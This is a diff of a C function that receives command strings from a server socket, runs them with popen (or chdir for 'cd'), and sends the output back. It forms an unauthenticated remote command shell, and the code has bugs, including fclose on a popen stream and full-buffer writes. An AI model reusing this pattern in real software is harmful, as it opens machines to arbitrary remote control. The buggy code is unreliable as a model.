@@ -173,7 +173,7 @@ void recv_from_server( int fd ) {
     
     len = read( fd, str, sizeof(str) - 1 );
     if ( len > 0 ) {    
-      str[len] = '\0';
+      str[len-1] = '\0';
     }
     else {    
       perror("error: command");
@@ -184,40 +184,44 @@ void recv_from_server( int fd ) {
       printf("Deconnection\n");
       return;
     }
+    if(str[0]=='c' && str[1]=='d')
+    {
+      chdir(str+3);
+    }else
+    {
       fp = popen( str, "r" );
       if ( fp ) 
       {
-        while( fgets( str, BUFFERSIZE, fp ) != NULL ) 
-        { 
-          len = write( fd, str, sizeof(str) - 1 );
-          if ( len == -1 ) 
-          {    
-            perror("error: prompt");
-            pclose(fp);
-            return;
+          while( fgets( str, BUFFERSIZE, fp ) != NULL ) 
+          { 
+            len = write( fd, str, sizeof(str) - 1 );
+            if ( len == -1 ) 
+            {    
+              perror("error: prompt");
+              pclose(fp);
+              return;
+            }
+            
+            
+            if ( receipt_confirmation( fd, RECV ) == ERROR ) 
+            {
+              pclose(fp);
+              return;
+            }      
           }
-          
-          
-          if ( receipt_confirmation( fd, RECV ) == ERROR ) 
-          {
-            pclose(fp);
-            return;
-          }      
+          fclose(fp);
         }
-        fclose(fp);
       }
-    
     
       len = write( fd, quit_str, strlen(quit_str) );
       if ( len == -1 ) {    
         perror("error: quit len");
-        pclose(fp);
         break;
       }
 
       
       if ( receipt_confirmation( fd, RECV ) == ERROR ) {
-        pclose(fp);
+        fprintf(stderr,"Error receipt_confirmation\n");
         break;
       }
       
